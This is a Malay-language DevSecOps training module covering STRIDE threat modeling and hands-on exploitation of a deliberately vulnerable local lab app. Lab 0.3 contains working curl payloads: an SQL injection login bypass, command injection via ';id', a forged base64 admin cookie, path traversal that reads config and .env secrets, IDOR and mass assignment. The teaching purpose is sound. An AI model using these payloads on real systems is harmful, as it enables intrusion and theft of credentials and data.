# Modul 0: Pengenalan DevSecOps dan threat modeling

**Hari 1, 9:00 pagi hingga 1:00 petang**

Dalam modul ini anda akan:

1. Faham apa itu DevSecOps, shift-left dan quality gate, dan kenapa kontena serta kod yang dijana AI mengubah risiko.
2. Kenal lima jenis imbasan dan di mana setiap satu berada dalam pipeline.
3. Membuat **threat model** untuk app Kedai Bengkel menggunakan gambar rajah aliran data dan STRIDE.
4. Menjalankan app lab dan **mengeksploit** tiga kelemahan secara manual, supaya anda tahu apa yang imbasan sepatutnya tangkap.

> Prasyarat: bahagian [Persediaan](../00-persediaan/README.md) siap, terutama Docker dan repo lab.

## Jadual

| Masa | Aktiviti |
|---|---|
| 9:00 – 10:00 | Slaid: DevSecOps, kontena, AI, lima jenis imbasan |
| 10:00 – 10:15 | Rehat |
| 10:15 – 11:30 | Teori threat modeling dan Makmal 0.1 |
| 11:30 – 12:30 | Makmal 0.2 dan 0.3: jalankan app, eksploit manual |
| 12:30 – 1:00 | Makmal 0.4: semak Harbor dan alat |

---

## Teori ringkas

### DevSecOps dan shift-left

**DevSecOps** menjadikan keselamatan tanggungjawab bersama sepanjang kitaran pembangunan, bukan semakan akhir oleh pasukan lain. **Shift-left** bermaksud mengalihkan pemeriksaan ke peringkat awal (ke kiri pada garis masa): kelemahan yang ditemui semasa commit memakan masa minit untuk dibaiki; yang ditemui di produksi memakan hari, dan kadang-kadang melibatkan insiden.

Sebuah **quality gate** ialah syarat automatik dalam pipeline: jika imbasan menemui sesuatu yang melebihi had yang ditetapkan, pipeline gagal dan perubahan tidak bergerak ke hadapan.

<div data-fig="lima-imbasan"></div>

| Imbasan | Soalan yang dijawab | Contoh dalam bengkel |
|---|---|---|
| **Secret Detection** | Adakah ada kata laluan atau kunci dalam kod dan sejarah git? | Gitleaks |
| **SAST** | Adakah kod sumber mengandungi corak yang tidak selamat? | Semgrep |
| **SCA** | Adakah pakej pihak ketiga ada kerentanan yang diketahui? | Trivy, `dotnet list package`, `composer audit` |
| **IaC** | Adakah Dockerfile, manifest K8s dan Terraform tidak selamat? | Trivy config, Checkov, hadolint, kube-linter |
| **DAST** | Adakah app yang sedang berjalan boleh diserang? | ZAP |

Tiada satu pun yang cukup sendirian. Dalam bengkel ini anda akan melihat dengan data sebenar apa yang setiap alat tangkap dan terlepas.

### Kenapa kontena dan AI mengubah risiko

- **Kontena** membungkus app bersama OS dan pakejnya. Satu image membawa ratusan pakej yang anda tidak tulis. Image lama atau berasaskan SDK membawa kerentanan, dan konfigurasi runtime (root, privileged) menentukan seberapa buruk kesan jika app dieksploit.
- **Kod yang dijana AI** ditulis laju dan kelihatan betul. Ia boleh mengandungi corak tidak selamat (SQL digabung dengan rentetan), dan boleh mencadangkan **pakej yang tidak wujud** atau yang diambil alih penyerang. Kelajuan menulis tidak menambah kelajuan menyemak, jadi imbasan automatik menjadi lebih penting, bukan kurang.
- **Aplikasi yang menggunakan LLM** menambah kelas risiko baharu (prompt injection, kebocoran data melalui prompt). OWASP Top 10 for LLM Applications ialah rujukan permulaan. Ia di luar skop makmal, tetapi ancaman dalam senarai itu dimodelkan dengan cara yang sama seperti di bawah.

### Threat modeling

Threat modeling ialah cara berfikir sistematik tentang apa yang boleh salah **sebelum** menulis atau mengimbas kod. Ia menjawab empat soalan:

1. **Apa yang kita bina?** Lukis gambar rajah aliran data (DFD).
2. **Apa yang boleh jadi salah?** Gunakan STRIDE pada setiap aliran dan komponen.
3. **Apa yang kita buat tentangnya?** Kurangkan, pindahkan, terima atau elakkan.
4. **Adakah kita buat dengan baik?** Sahkan dengan ujian dan imbasan.

Elemen DFD: **entiti luar** (pengguna), **proses** (app), **simpanan data** (DB, fail), **aliran data** (anak panah), dan **sempadan kepercayaan** (garis yang dilalui data apabila berpindah antara tahap kepercayaan berbeza). Ancaman paling banyak berlaku pada anak panah yang **merentas sempadan**.

**STRIDE** ialah senarai semak enam jenis ancaman:

| Huruf | Ancaman | Sifat yang dilanggar | Contoh dalam Kedai Bengkel |
|---|---|---|---|
| S | Spoofing | Pengesahan | Memalsukan cookie `session` untuk jadi admin |
| T | Tampering | Integriti | SQL injection mengubah query |
| R | Repudiation | Tidak boleh disangkal | Tiada log siapa menulis dalam buku pelawat |
| I | Information disclosure | Kerahsiaan | Path traversal membaca `appsettings.json` atau `.env` |
| D | Denial of service | Ketersediaan | `ping` tanpa had mengunci proses |
| E | Elevation of privilege | Kebenaran | Command injection menjalankan arahan sebagai root |

<div data-fig="dfd-kedai"></div>

---

## Makmal 0.1: Threat model Kedai Bengkel

**Tujuan.** Menjana senarai ancaman daripada DFD sebelum melihat satu pun hasil imbasan.

**Masa.** 60 minit, berpasangan: bahagian A (jadual) 30 minit, bahagian B (Threat Dragon) 30 minit.

### Bahagian A: jadual ancaman

Rujuk rajah di atas. Salin jadual ini pada kertas atau fail teks dan isikan sekurang-kurangnya **enam** baris. Satu contoh diberi.

| # | Aliran / komponen | STRIDE | Ancaman | Kawalan yang dicadangkan |
|---|---|---|---|---|
| 1 | Pengguna → App (log masuk) | T | Input log masuk digabung dalam query SQL | Query berparameter |
| 2 | | | | |

Soalan panduan:

1. Aliran mana yang merentas sempadan kepercayaan?
2. Apa yang berlaku jika data daripada pengguna sampai ke **shell**, **sistem fail** atau **pangkalan data**?
3. Apa yang menentukan bahawa seseorang itu admin? Boleh dipalsukan?
4. Apa yang dipaparkan semula kepada pengguna lain (buku pelawat)?
5. Apa yang berlaku di sekeliling app (image, pipeline, kluster) yang tidak ada dalam rajah? Tambah satu entiti luar untuk rantaian bekalan.

<details>
<summary>Jawapan contoh</summary>

| # | Aliran / komponen | STRIDE | Ancaman | Kawalan |
|---|---|---|---|---|
| 1 | Pengguna → App `/login` | T, S | SQL injection melepasi log masuk | Query berparameter, hash kata laluan yang kuat (bukan MD5) |
| 2 | Pengguna → App `/search` | T, I | SQL injection membaca jadual `users` | Query berparameter |
| 3 | Pengguna → App `/search`, `/ping` | T | XSS pantulan | Output encoding, CSP |
| 4 | Pengguna → App `/guestbook` | T, R | XSS tersimpan, tiada CSRF, tiada log pengarang | Encoding, token CSRF, log audit |
| 5 | App → Proses OS `/ping` | E | Command injection (jalan sebagai root) | Jangan guna shell, senarai hujah, validasi, pengguna bukan root |
| 6 | App → Sistem fail `/download` | I | Path traversal membaca konfigurasi dan secret | Normalisasi laluan, senarai putih |
| 7 | Admin → App `/admin` | S, E | Cookie base64 boleh dipalsukan | Sesi ditandatangani/disulitkan di server |
| 8 | `/api/users/{id}` | I | IDOR dan hash kata laluan didedahkan | Semakan kebenaran, jangan pulangkan hash |
| 9 | Pipeline → Image → Kluster | T | Image atau pakej dirosakkan | Imbasan SCA/image, tandatangan image (Modul 6) |

Perhatikan bahawa kebanyakan baris ini akan muncul semula sebagai temuan imbasan dalam modul seterusnya. Threat model memberi anda **bahasa** untuk menilai temuan itu.
</details>

### Bahagian B: masukkan ke OWASP Threat Dragon

[OWASP Threat Dragon](https://www.threatdragon.com/) ialah alat sumber terbuka untuk melukis DFD dan merekod ancaman bagi setiap unsur. Model disimpan sebagai **satu fail JSON**, jadi ia boleh dimasukkan dalam repo, disemak dalam pull request dan dikemas kini apabila reka bentuk berubah. Inilah maksud "threat model sebagai kod".

> Alat ini **pilihan**. Jika pemasangan gagal, siapkan bahagian A sahaja; jadual dan Threat Dragon menghasilkan maklumat yang sama.

**Pasang (di Windows, bukan dalam WSL).** Muat turun `Threat-Dragon-ng-Setup-2.6.2.exe` (≈ 154 MB) daripada [halaman release](https://github.com/OWASP/threat-dragon/releases) dan jalankan pemasang. Pilih versi desktop: ia menyimpan fail di laptop anda, tanpa log masuk GitHub dan tanpa Docker. Versi ini kami tulis semasa tutorial dibina; jika halaman release sudah ada versi lebih baharu, pilih yang stabil terkini.

**Buka model.** Simpan `kedai-bengkel-kosong.json` (bahagian **Fail modul** di hujung modul ini) dalam folder repo anda. Dalam Threat Dragon:

1. Pada halaman Welcome, klik kawasan **open** dan pilih `kedai-bengkel-kosong.json`.
2. Klik **Aliran data utama** (nama rajah) untuk membuka penyunting rajah. Anda akan melihat DFD yang sama seperti di atas: dua entiti luar, app, proses OS, pangkalan data, sistem fail dan garis sempadan kepercayaan.

**Tambah ancaman.**

1. Klik satu unsur, contohnya anak panah **Permintaan pengguna**. Sifat unsur dan ancamannya muncul di panel bawah.
2. Klik **New Threat**. Isi **Title**, pilih **Threat Type** (enam jenis STRIDE), **Severity**, tulis **Description** dan **Mitigations**, kemudian klik **Apply**.
3. Ulang sehingga anda ada sekurang-kurangnya **enam** ancaman, sepadan dengan jadual di bahagian A. Sempadan kepercayaan tidak boleh mempunyai ancaman; letakkan ancaman pada anak panah yang merentasinya.
4. Klik **Save**. Fail JSON anda kini mengandungi semua ancaman.

**Ukur dengan kunci jawapan.** Buka `kedai-bengkel-jawapan.json` dengan cara yang sama dan bandingkan. Ia mengandungi sembilan ancaman, sepadan dengan jadual jawapan di atas. Soalan perbincangan:

- Ancaman mana yang anda lihat tetapi kunci jawapan tiada? Itu mungkin ancaman sebenar yang kami terlepas.
- Ancaman mana yang boleh dikesan oleh imbasan (SAST, DAST, SCA) dan mana yang tidak? Tulis di sebelah setiap ancaman; jawapannya akan menjadi jelas apabila anda melihat hasil imbasan dalam modul seterusnya.

> Nama jenis dan butang di atas diambil daripada dokumentasi rasmi Threat Dragon 2.x. Antara muka boleh berbeza sedikit mengikut versi.


---

## Makmal 0.2: Jalankan app lab

**Tujuan.** Pastikan app anda berjalan, dan fahami bahawa imbasan yang akan anda jalankan menyasarkan app yang sebenar.

<div class="trk trk-a" markdown="1">

```bash
cd ~/devsecops-lab
docker buildx build --provenance=false --sbom=false --load -t aspnet-app:latest aspnet-app
docker run -d --name kedai -p 8080:8080 aspnet-app:latest
sleep 5
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080/
```

Binaan pertama ≈ 1 minit. Jawapan `200` bermakna app berjalan; buka <http://localhost:8080> dalam pelayar.

</div>

<div class="trk trk-b" markdown="1">

```bash
cd ~/devsecops-lab
docker buildx build --provenance=false --sbom=false --load -t laravel-app:latest laravel-app
docker run -d --name kedai -p 8081:8080 laravel-app:latest
sleep 8
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8081/
```

Binaan pertama ≈ 2 minit kerana Composer memuat turun dependency. Jawapan `200` bermakna app berjalan; buka <http://localhost:8081>.

</div>

> `--provenance=false --sbom=false` menghalang Docker menambah attestation pada image. Kita perlukan ini pada Modul 4 supaya polisi Harbor berfungsi. Biasakan diri menggunakannya.

---

## Makmal 0.3: Eksploit manual

**Tujuan.** Rasa sendiri kesan tiga kelemahan. Ini ialah **sebab** kita mengimbas.

Ini dibenarkan kerana app ialah milik anda dan berjalan pada laptop anda sendiri.

<div class="trk trk-a" markdown="1">

Tetapkan alamat app:

```bash
APP=http://localhost:8080
```

**1. SQL injection melepasi log masuk.** Cuba kata laluan salah dahulu, kemudian suntik:

```bash
curl -s -X POST $APP/login --data-urlencode "username=admin" --data-urlencode "password=salah" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
curl -s -X POST $APP/login --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
```

**2. Command injection.** Ping biasa, kemudian sambung arahan:

```bash
curl -s "$APP/ping?host=127.0.0.1" | grep -oE "bytes from"
curl -s "$APP/ping?host=127.0.0.1;id" | grep -oE "uid=[^<]*"
```

**3. Cookie sesi boleh dipalsukan.** Cookie hanyalah `nama:peranan` dalam base64:

```bash
curl -s -o /dev/null -w "tanpa cookie: %{http_code}\n" $APP/admin
curl -s -H "Cookie: session=$(printf 'sesiapa:admin' | base64)" $APP/admin | grep -oE "Akses ditolak|Panel admin"
```

Bonus: path traversal dan IDOR.

```bash
curl -s "$APP/download?file=../appsettings.json" | head -12
curl -s $APP/api/users/1
```

</div>

<div class="trk trk-b" markdown="1">

Tetapkan alamat app:

```bash
APP=http://localhost:8081
```

**1. SQL injection melepasi log masuk.** Cuba kata laluan salah dahulu, kemudian suntik:

```bash
curl -s -X POST $APP/login --data-urlencode "username=admin" --data-urlencode "password=salah" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
curl -s -X POST $APP/login --data-urlencode "username=admin'--" --data-urlencode "password=x" | grep -oE "Log masuk gagal|Selamat datang[^<]*"
```

**2. Command injection.** Ping biasa, kemudian sambung arahan:

```bash
curl -s "$APP/ping?host=127.0.0.1" | grep -oE "bytes from"
curl -s "$APP/ping?host=127.0.0.1;id" | grep -oE "uid=[^<]*"
```

**3. Cookie sesi boleh dipalsukan.** Cookie hanyalah `nama:peranan` dalam base64:

```bash
curl -s -o /dev/null -w "tanpa cookie: %{http_code}\n" $APP/admin
curl -s -H "Cookie: session=$(printf 'sesiapa:admin' | base64)" $APP/admin | grep -oE "Akses ditolak|Panel admin"
```

Bonus: path traversal (fail `.env` mengandungi `APP_KEY`), IDOR dan mass assignment.

```bash
curl -s "$APP/download?file=../.env" | head -5
curl -s $APP/api/users/1
curl -s -X POST $APP/api/profile/2 -d "role=admin"
```

</div>

Kenal pasti: bagi setiap serangan, apa yang STRIDE kata? Padankan dengan baris dalam jadual threat model anda.

<details>
<summary>Jawapan jangkaan</summary>

- Kata laluan salah memberi `Log masuk gagal`; `admin'--` memberi `Selamat datang, admin` (komen SQL `--` memotong semakan kata laluan).
- `;id` memberi `uid=0(root) gid=0(root)`: arahan dijalankan sebagai root dalam kontena.
- Tanpa cookie halaman memaparkan `Akses ditolak` (kod 200 pada ASP.NET, 403 pada Laravel); dengan cookie palsu `Panel admin`.
- `/api/users/1` memulangkan rekod admin termasuk hash MD5 kata laluan.
</details>

---

## Makmal 0.4: Semak Harbor dan alat

**Tujuan.** Sahkan akses ke Harbor sebelum modul berasaskan imej pada Hari 3.

Tetapkan nombor anda (contoh `peserta03`) sekali sahaja untuk sesi ini:

```bash
P=peserta03
docker login harbor.lab.test -u $P
```

<div class="trk trk-a" markdown="1">

```bash
docker tag aspnet-app:latest harbor.lab.test/$P/aspnet-app:uji
docker push harbor.lab.test/$P/aspnet-app:uji
```

</div>

<div class="trk trk-b" markdown="1">

```bash
docker tag laravel-app:latest harbor.lab.test/$P/laravel-app:uji
docker push harbor.lab.test/$P/laravel-app:uji
```

</div>

Buka <https://harbor.lab.test> dalam pelayar, log masuk, dan lihat image anda dalam projek `pesertaNN`. Tunggu beberapa saat; Harbor mengimbas secara automatik dan menunjukkan kiraan kerentanan.

Hentikan app:

```bash
docker rm -f kedai
```

## Senarai semak Modul 0

- [ ] Saya boleh menerangkan shift-left dan quality gate dengan ayat sendiri
- [ ] Saya sudah mengisi sekurang-kurangnya enam baris threat model
- [ ] (Pilihan) Saya sudah memasukkannya ke Threat Dragon dan menyimpan fail JSON
- [ ] App saya berjalan dan saya berjaya mengeksploit tiga kelemahan
- [ ] Saya berjaya push image ke projek Harbor saya dan melihat hasil imbasannya
- [ ] Saya tahu STRIDE huruf mana untuk setiap serangan tadi

## Rujukan

- OWASP Threat Modeling: <https://owasp.org/www-community/Threat_Modeling>
- OWASP Threat Dragon: <https://owasp.org/www-project-threat-dragon/> dan dokumentasi <https://www.threatdragon.com/docs/>
- OWASP Top 10: <https://owasp.org/Top10/>
- OWASP Top 10 for LLM Applications: <https://genai.owasp.org/llm-top-10/>
